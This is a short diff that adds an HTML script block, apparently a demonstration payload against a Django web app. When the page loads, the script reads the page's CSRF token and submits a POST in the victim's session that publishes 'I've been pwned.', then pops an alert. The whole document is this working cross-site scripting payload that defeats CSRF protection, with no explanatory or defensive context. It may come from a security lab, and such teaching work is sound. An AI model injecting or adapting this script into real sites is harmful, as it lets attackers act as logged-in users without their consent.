@@ -1,0 +1,16 @@
+<script>
+    function attack() {
+        fetch("/").then((resp) => resp.text()).then((text) => {
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(text, "text/html");
+            const csrfToken = doc.querySelector("input[name=csrfmiddlewaretoken]").value;
+            const formData = new FormData();
+            formData.append("csrfmiddlewaretoken", csrfToken);
+            formData.append("content", "I've been pwned.");
+            fetch("/", {method: "POST", body: formData, credentials: "same-origin"}).then(() => {
+                alert("Mouahaha!");
+            });
+        })
+    }
+    document.addEventListener('DOMContentLoaded', attack, false);
+</script>
